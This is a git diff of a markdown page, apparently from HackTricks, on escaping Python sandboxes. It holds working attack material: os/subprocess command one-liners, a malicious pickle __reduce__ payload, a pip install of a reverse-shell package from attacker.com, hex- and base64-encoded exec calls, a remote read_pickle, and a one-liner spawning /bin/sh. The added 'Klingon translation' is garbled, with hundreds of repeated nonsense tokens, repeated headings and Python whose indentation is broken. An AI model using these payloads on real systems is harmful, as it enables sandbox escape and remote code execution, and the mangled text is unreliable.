@@ -28,10 +28,41 @@ These are some tricks to bypass python sandbox protections and execute arbitrary
 
 The first thing you need to know is if you can directly execute code with some already imported library, or if you could import any of these libraries:
 
+Klingon Translation:
+
+# Bypass Python sandboxes
+
+<details>
+
+<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+
+Other ways to support HackTricks:
+
+* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
+* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
+* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+
+</details>
+
+<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
+
+Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.
+
+{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
+
+***
+
+These are some tricks to bypass python sandbox protections and execute arbitrary commands.
+
+## Command Execution Libraries
+
+The first thing you need to know is if you can directly execute code with some already imported library, or if you could import any of these libraries:
 ```python
 os.system("ls")
 os.popen("ls").read()
-commands.getstatusoutput("ls") 
+commands.getstatusoutput("ls")
 commands.getoutput("ls")
 commands.getstatus("file/path")
 subprocess.call("ls", shell=True)
@@ -60,14 +91,13 @@ open('/var/www/html/input', 'w').write('123')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
-
-Remember that the _**open**_ and _**read**_ functions can be useful to **read files** inside the python sandbox and to **write some code** that you could **execute** to **bypass** the sandbox.
+**ghItlhvam** _**open**_ **je** _**read**_ **ghItlhvam** **files** **cha'logh** **python sandbox** **'ej** **code** **cha'logh** **bIghel** **bypass**.
 
 {% hint style="danger" %}
-**Python2 input()** function allows executing python code before the program crashes.
+**Python2 input()** **function** **python code** **program crashes** **bIghel**.
 {% endhint %}
 
-Python try to **load libraries from the current directory first** (the following command will print where is python loading modules from): `python3 -c 'import sys; print(sys.path)'`
+Python **libraries** **load** **current directory** **first** (the following command will print where is python loading modules from): `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../.gitbook/assets/image (552).png>)
 
@@ -75,10 +105,9 @@ Python try to **load libraries from the current directory first** (the following
 
 ### Default packages
 
-You can find a **list of pre-installed** packages here: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
-Note that from a pickle you can make the python env **import arbitrary libraries** installed in the system.\
-For example, the following pickle, when loaded, is going to import the pip library to use it:
-
+**list of pre-installed** **packages** **yIqaw** **'ej** [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+**pickle** **python env** **import arbitrary libraries** **installed** **system**.\
+**Example**, **pickle**, **loaded**, **pip library** **use** **bIghel**:
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -86,12 +115,11 @@ For example, the following pickle, when loaded, is going to import the pip libra
 
 import pickle, os, base64, pip
 class P(object):
-    def __reduce__(self):
-        return (pip.main,(["list"],))
+def __reduce__(self):
+return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-
 For more information about how pickle works check this: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
 ### Pip package
@@ -99,28 +127,19 @@ For more information about how pickle works check this: [https://checkoway.net/m
 Trick shared by **@isHaacK**
 
 If you have access to `pip` or `pip.main()` you can install an arbitrary package and obtain a reverse shell calling:
-
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
+**bypass-python-sandboxes/README.md**
 
-You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
+---
 
-{% file src="../../../.gitbook/assets/reverse.tar.gz" %}
+# Bypass Python Sandboxes
 
-{% hint style="info" %}
-This package is called `Reverse`. However, it was specially crafted so that when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
-{% endhint %}
+---
 
-## Eval-ing python code
-
-{% hint style="warning" %}
-Note that exec allows multiline strings and ";", but eval doesn't (check walrus operator)
-{% endhint %}
-
-If certain characters are forbidden you can use the **hex/octal/B64** representation to **bypass** the restriction:
-
+**QaH** **package** **download** **laH** **reverse shell** **DIvI'**. **ghu'** **ghItlh** **'ej** **'oH** **'ej** **reverse shell** **DIvI'** **IP** **put** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -141,9 +160,13 @@ exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x
 exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
+### tlhIngan Hol
 
-### Other libraries that allow to eval python code
+### vItlhutlh
 
+#### `exec`
+
+`exec` vItlhutlh python code 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e'
 ```python
 #Pandas
 import pandas as pd
@@ -157,9 +180,24 @@ df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
 # Like:
 df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
 ```
+## Qapla'wI' je 'ej qutlh! 
 
-## Operators and short tricks
+### 'op
+#### 'op
+##### 'op
+###### 'op
 
+### Qapla'wI' je 'ej qutlh! 
+
+#### 'op
+##### 'op
+###### 'op
+
+### Qapla'wI' je 'ej qutlh! 
+
+#### 'op
+##### 'op
+###### 'op
 ```python
 # walrus operator allows generating variable inside a list
 ## everything will be executed in order
@@ -168,40 +206,36 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 [y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
 ## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
 ```
-
 ## Bypassing protections through encodings (UTF-7)
 
 In [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 is used to load and execute arbitrary python code inside an apparent sandbox:
 
+##  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  